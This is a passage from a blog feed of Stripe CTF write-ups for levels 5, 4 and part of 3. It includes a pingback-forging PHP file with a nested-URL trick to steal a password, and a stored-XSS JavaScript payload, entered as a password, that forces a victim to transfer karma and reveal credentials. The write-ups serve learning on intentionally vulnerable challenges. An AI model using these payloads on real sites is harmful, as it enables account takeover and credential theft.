everyone of them. It would be way simpler to be able to log into a new
web service using your Google account, or your Facebook account (kind of
like &lt;a class="reference external" href="https://en.wikipedia.org/wiki/OpenID"&gt;OpenID&lt;/a&gt;). That's what
this level is all about.&lt;/p&gt;
&lt;p&gt;This service asks for a pingback address (it's the service you want
to use to identify, like using Google or Facebook with OpenID), and your
username/password to this pingback. The form will then send your
credentials to the pingback and see if you're successfully
authenticated.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# File srv.rb, line 20&lt;/span&gt;
&lt;span class="no"&gt;PASSWORD_HOSTS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="sr"&gt;/^level05-\d+\.stripe-ctf\.com$/&lt;/span&gt; &lt;span class="c1"&gt;# To get the password, the pingback must follow this regex&lt;/span&gt;
&lt;span class="no"&gt;ALLOWED_HOSTS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="sr"&gt;/\.stripe-ctf\.com$/&lt;/span&gt; &lt;span class="c1"&gt;# The pingback must follow this regex&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Note that these regex were for the real CTF. For a local usage, here are
what they look like:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# File srv.rb, line 23&lt;/span&gt;
&lt;span class="no"&gt;PASSWORD_HOSTS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="sr"&gt;/^localhost$/&lt;/span&gt; &lt;span class="c1"&gt;# To get the password, the pingback must follow this regex&lt;/span&gt;
&lt;span class="no"&gt;ALLOWED_HOSTS&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="sr"&gt;//&lt;/span&gt; &lt;span class="c1"&gt;# No restriction on the allowed hosts&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;We can only use pingback URL ending in .stripe-ctf.com, but fortunately,
we still have access to the social network on level #2! We can upload a
PHP file, which will always say the authentication is successful.&lt;/p&gt;
&lt;p&gt;Note: on the next screenshots, I'll use 127.0.0.1 as the address for
level #2, and localhost as the address for level #5!&lt;/p&gt;
&lt;p&gt;So, how does the service know that we were successfully authenticated to
the pingback?&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# File srv.rb, line 109&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;authenticated?&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;body&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;body&lt;/span&gt; &lt;span class="o"&gt;=~&lt;/span&gt; &lt;span class="sr"&gt;/[^\w]AUTHENTICATED[^\w]*$/&lt;/span&gt;
&lt;span class="k"&gt;end&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;So, all we have to do is upload the following file to level #2:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;&amp;lt;?php&lt;/span&gt;
    &lt;span class="k"&gt;echo&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot; AUTHENTICATED &lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;;&lt;/span&gt;
&lt;span class="cp"&gt;?&amp;gt;&lt;/span&gt;&lt;span class="x"&gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Let's fill the form to use &lt;code&gt;level02-[numbers].stripe-ctf.com&lt;/code&gt;
as a pingback:&lt;/p&gt;
&lt;img alt="level05-first-form.png" class="align-center" src="/images/stripe-ctf-level-5/level05-first-form.png" /&gt;
&lt;p&gt;We submit, and here are the result of the authentication...&lt;/p&gt;
&lt;img alt="level05-first-login.png" class="align-center" src="/images/stripe-ctf-level-5/level05-first-login.png" /&gt;
&lt;p&gt;...and the new login page:&lt;/p&gt;
&lt;img alt="level05-first-authentication.png" class="align-center" src="/images/stripe-ctf-level-5/level05-first-authentication.png" /&gt;
&lt;p&gt;Okay, now we can authenticate using this script, but we can't recover
the password, cause the URL is
&lt;code&gt;level02-[numbers].stripe-ctf.com&lt;/code&gt;, and not
&lt;code&gt;level05-[numbers].stripe-ctf.com&lt;/code&gt;. The key is to see how the
server recovers the pingback URL we give him:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# File srv.rb, line 67&lt;/span&gt;
&lt;span class="n"&gt;pingback&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;params&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:pingback&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="n"&gt;username&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;params&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:username&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="n"&gt;password&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;params&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:password&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="o"&gt;[...]&lt;/span&gt;
&lt;span class="c1"&gt;# File srv.rb, line 80&lt;/span&gt;
&lt;span class="n"&gt;body&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;perform_authenticate&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;pingback&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;[...]&lt;/span&gt;
&lt;span class="c1"&gt;# File srv.rb, line 99&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;perform_authenticate&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="vg"&gt;$log&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;info&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Sending request to &lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;response&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="no"&gt;RestClient&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="ss"&gt;:password&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
                                     &lt;span class="ss"&gt;:username&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;})&lt;/span&gt;
    &lt;span class="n"&gt;body&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;response&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;body&lt;/span&gt;

    &lt;span class="vg"&gt;$log&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;info&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;Server responded with: &lt;/span&gt;&lt;span class="si"&gt;#{&lt;/span&gt;&lt;span class="n"&gt;body&lt;/span&gt;&lt;span class="si"&gt;}&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;body&lt;/span&gt;
&lt;span class="k"&gt;end&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The server uses &lt;code&gt;params&lt;/code&gt; to recover the informations sent by
the form. Then it &lt;code&gt;POST&lt;/code&gt; s the username and the password to the
to the pingback URL. But &lt;code&gt;params&lt;/code&gt; is the Ruby equivalent of
&lt;code&gt;$_REQUEST&lt;/code&gt; in PHP, which recovers the informations sent by
&lt;code&gt;POST&lt;/code&gt;, but also by &lt;code&gt;GET&lt;/code&gt;. So let's say we put this as
a pingback URL:
&lt;code&gt;http://leve05-[numbers].stripe-ctf.com?pingback=http://level02-[numbers].stripe-ctf.com&lt;/code&gt;.&lt;/p&gt;
&lt;p&gt;Okay, here is where it gets tricky: the server retrieves the previous
URL as a pingback. It then posts our username/password to it, i.e. to
itself, since the address is
&lt;code&gt;level05-[numbers].stripe-ctf.com&lt;/code&gt;. So the server finds itself
with a username/password by &lt;code&gt;POST&lt;/code&gt;, and a pingback (the level
#2 URL) by &lt;code&gt;GET&lt;/code&gt;. So it does its business: sends the
username/password to the pingback.&lt;/p&gt;
&lt;p&gt;First we fill in the login:&lt;/p&gt;
&lt;img alt="level05-second-form.png" class="align-center" src="/images/stripe-ctf-level-5/level05-second-form.png" /&gt;
&lt;p&gt;Then we submit:&lt;/p&gt;
&lt;img alt="level05-second-login.png" class="align-center" src="/images/stripe-ctf-level-5/level05-second-login.png" /&gt;
&lt;p&gt;We clearly see here that the server was interrogated twice.&lt;/p&gt;
&lt;p&gt;And we just have to go back to the login page:&lt;/p&gt;
&lt;img alt="level05-w00t.png" class="align-center" src="/images/stripe-ctf-level-5/level05-w00t.png" /&gt;
&lt;p&gt;w00t!&lt;/p&gt;
</content></entry><entry><title>Stripe CTF: Level #4</title><link href="https://allyourbase.utouch.fr/posts/2012/10/27/stripe-ctf-level-4/" rel="alternate"></link><published>2012-10-27T14:22:00+02:00</published><updated>2012-10-27T14:22:00+02:00</updated><author><name>useless</name></author><id>tag:allyourbase.utouch.fr,2012-10-27:/posts/2012/10/27/stripe-ctf-level-4/</id><summary type="html">&lt;img alt="level04-logo.jpg" class="align-center" src="/images/stripe-ctf-level-4/level04-logo.jpg" /&gt;
&lt;p&gt;You can find the code for this level
&lt;a class="reference external" href="/docs/stripe-ctf-level-4/stripe-ctf-level04.tar.gz"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;(sha256: &lt;code&gt;07a8338f0ecf92537daedb60709cd8211a790a23f9c25a101e069614b32da2a8&lt;/code&gt;)&lt;/p&gt;
&lt;p&gt;This level wants you to spread joy over the world. You have a certain
amount of karma you can distribute to people. But to be sure that you
only send karma to people you really trust to be good …&lt;/p&gt;</summary><content type="html">&lt;img alt="level04-logo.jpg" class="align-center" src="/images/stripe-ctf-level-4/level04-logo.jpg" /&gt;
&lt;p&gt;You can find the code for this level
&lt;a class="reference external" href="/docs/stripe-ctf-level-4/stripe-ctf-level04.tar.gz"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;(sha256: &lt;code&gt;07a8338f0ecf92537daedb60709cd8211a790a23f9c25a101e069614b32da2a8&lt;/code&gt;)&lt;/p&gt;
&lt;p&gt;This level wants you to spread joy over the world. You have a certain
amount of karma you can distribute to people. But to be sure that you
only send karma to people you really trust to be good, everyone you send
karma to will be able to see your password. What's more, the user
karma_fountain is soooo good that he has infinite karma. Wouldn't it be
nice if you could get access to his account?&lt;/p&gt;
&lt;p&gt;Here, we can see that the user captain sent us one karma. Now, his
password, ''captain_password'', is visible to us.&lt;/p&gt;
&lt;img alt="level04-transfer_captain_cats.png" class="align-center" src="/images/stripe-ctf-level-4/level04-transfer_captain_cats.png" /&gt;
&lt;p&gt;So, all we have to do to get karma_fountain's password is to get him to
send us karma. Two ways for this: we could be so good that he'll want to
give us karma, or we can force him a little bit.&lt;/p&gt;
&lt;p&gt;So, what are our ways to interact with karma_fountain? The site doesn't
offer some kind of internal messaging, we don't have an email address...
All we can do is send karma_fountain some karma. Then, he'll see our
password on his profile page. Hmmm, our password will be written to its
profile page:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# File views/home.erb, line 52&lt;/span&gt;
&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sx"&gt;% @registered_users.each &lt;/span&gt;&lt;span class="k"&gt;do&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="n"&gt;user&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="sx"&gt;%&amp;gt;&lt;/span&gt;
&lt;span class="sx"&gt;&amp;lt;% last_active = user[:last_active].strftime(&amp;#39;%H:%M:%S UTC&amp;#39;) %&amp;gt;&lt;/span&gt;
&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sx"&gt;% if &lt;/span&gt;&lt;span class="vi"&gt;@trusts_me&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;include?&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:username&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt; &lt;span class="sx"&gt;%&amp;gt;&lt;/span&gt;
&lt;span class="sx"&gt;&amp;lt;li&amp;gt;&lt;/span&gt;
&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sx"&gt;%= user[:username] %&amp;gt;&lt;/span&gt;
&lt;span class="sx"&gt;(password: &amp;lt;%=&lt;/span&gt; &lt;span class="n"&gt;user&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:password&lt;/span&gt;&lt;span class="o"&gt;]&lt;/span&gt; &lt;span class="sx"&gt;%&amp;gt;, last active &amp;lt;%= last_active %&amp;gt;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="o"&gt;&amp;lt;&lt;/span&gt;&lt;span class="sr"&gt;/li&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;The password is not sanitized before it is displayed. Is it before it's
registered in the database?&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# File srv.rb, line 168&lt;/span&gt;
&lt;span class="no"&gt;DB&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;conn&lt;/span&gt;&lt;span class="o"&gt;[&lt;/span&gt;&lt;span class="ss"&gt;:users&lt;/span&gt;&lt;span class="o"&gt;].&lt;/span&gt;&lt;span class="n"&gt;insert&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;
    &lt;span class="ss"&gt;:username&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="ss"&gt;:password&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="ss"&gt;:karma&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="no"&gt;STARTING_KARMA&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;
    &lt;span class="ss"&gt;:last_active&lt;/span&gt; &lt;span class="o"&gt;=&amp;gt;&lt;/span&gt; &lt;span class="no"&gt;Time&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;now&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;utc&lt;/span&gt;
&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Nope. So if we put some javascript code as our password, and then we
send karma to karma_fountain, our password (i.e. the javascript code)
will be embedded in karma_fountain's page. If this javascript tells
karma_fountain's browser to send us karma, its password will be
displayed on our home page.&lt;/p&gt;
&lt;p&gt;So, let's create a user evil_hacker, with the following password:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="p"&gt;&amp;lt;&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;form&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;createElement&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;form&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nx"&gt;form&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;setAttribute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;method&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;post&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nx"&gt;form&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;setAttribute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;action&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;transfer&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;to_field&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;createElement&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;input&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nx"&gt;to_field&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;setAttribute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;type&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nx"&gt;to_field&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;setAttribute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;name&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;to&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nx"&gt;to_field&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;setAttribute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;value&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;cats&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nx"&gt;form&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;appendChild&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;to_field&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="kd"&gt;var&lt;/span&gt; &lt;span class="nx"&gt;amount_field&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;createElement&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;input&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nx"&gt;amount_field&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;setAttribute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;type&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;hidden&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nx"&gt;amount_field&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;setAttribute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;name&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;amount&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nx"&gt;amount_field&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;setAttribute&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;value&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;1&amp;quot;&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nx"&gt;form&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;appendChild&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;amount_field&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nb"&gt;document&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;body&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;appendChild&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nx"&gt;form&lt;/span&gt;&lt;span class="p"&gt;);&lt;/span&gt;
    &lt;span class="nx"&gt;form&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nx"&gt;submit&lt;/span&gt;&lt;span class="p"&gt;();&lt;/span&gt;
&lt;span class="p"&gt;&amp;lt;/&lt;/span&gt;&lt;span class="nt"&gt;script&lt;/span&gt;&lt;span class="p"&gt;&amp;gt;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Okay, I know this code is way too long, but javascript is really not my
strong suit. Plus, there is the problem that once karma_fountain's
browser executes the javascript, the transfer will take place, then
karma_fountain will be redirected to its homepage, where the transfer
will take place etc. Not very sly. So, there is room for improvement on
this code. It's just to demonstrate the attack.&lt;/p&gt;
&lt;img alt="level04-evil_hacker_register.png" class="align-center" src="/images/stripe-ctf-level-4/level04-evil_hacker_register.png" /&gt;
&lt;p&gt;We connect as evil_hacker and send one karma to karma_fountain. Then,
we wait for him to connect (the CTF staff had put up a bot which would
look at its profile page every five minutes). Let's look at our profile:&lt;/p&gt;
&lt;img alt="level04-w00t.png" class="align-center" src="/images/stripe-ctf-level-4/level04-w00t.png" /&gt;
&lt;p&gt;w00t!&lt;/p&gt;
</content></entry><entry><title>Stripe CTF: Level #3</title><link href="https://allyourbase.utouch.fr/posts/2012/10/26/stripe-ctf-level-3/" rel="alternate"></link><published>2012-10-26T23:34:00+02:00</published><updated>2012-10-26T23:34:00+02:00</updated><author><name>useless</name></author><id>tag:allyourbase.utouch.fr,2012-10-26:/posts/2012/10/26/stripe-ctf-level-3/</id><summary type="html">&lt;img alt="level03-logo.png" class="align-center" src="/images/stripe-ctf-level-3/level03-logo.png" /&gt;
&lt;p&gt;You can find the code for this level
&lt;a class="reference external" href="/docs/stripe-ctf-level-3/level03-code.tar.gz"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;(sha256: &lt;code&gt;8710c082daed1839806addebeda44c6e5496d44a33f7eb3f23a577b6a5fc26d5&lt;/code&gt;)&lt;/p&gt;
&lt;p&gt;The company who built the vault of level 0 learned its lesson: you now
have to identify before accessing your guarded secrets.&lt;/p&gt;
&lt;p&gt;The company kindly tells you that other users have already chosen to
use their product, and even …&lt;/p&gt;</summary><content type="html">&lt;img alt="level03-logo.png" class="align-center" src="/images/stripe-ctf-level-3/level03-logo.png" /&gt;
&lt;p&gt;You can find the code for this level
&lt;a class="reference external" href="/docs/stripe-ctf-level-3/level03-code.tar.gz"&gt;here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;(sha256: &lt;code&gt;8710c082daed1839806addebeda44c6e5496d44a33f7eb3f23a577b6a5fc26d5&lt;/code&gt;)&lt;/p&gt;
&lt;p&gt;The company who built the vault of level 0 learned its lesson: you now
have to identify before accessing your guarded secrets.&lt;/p&gt;
&lt;p&gt;The company kindly tells you that other users have already chosen to
use their product, and even what the stored secrets are.&lt;/p&gt;
&lt;img alt="level03-index.png" class="align-center" src="/images/stripe-ctf-level-3/level03-index.png" /&gt;
&lt;p&gt;Sorry for math and physics fan, but we'll focus on bob's secret.&lt;/p&gt;
&lt;p&gt;So, let's look at the code used to identify users:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;# File secretvault.py, line 74&lt;/span&gt;
&lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;login&lt;/span&gt;&lt;span class="p"&gt;():&lt;/span&gt;
    &lt;span class="n"&gt;username&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;flask&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;form&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;username&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="n"&gt;password&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;flask&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;request&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;form&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;get&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;password&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="n"&gt;username&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Must provide username&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;

    &lt;span class="k"&gt;if&lt;/span&gt; &lt;span class="ow"&gt;not&lt;/span&gt; &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s2"&gt;&amp;quot;Must provide password&lt;/span&gt;&lt;span class="se"&gt;\n&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot;&lt;/span&gt;

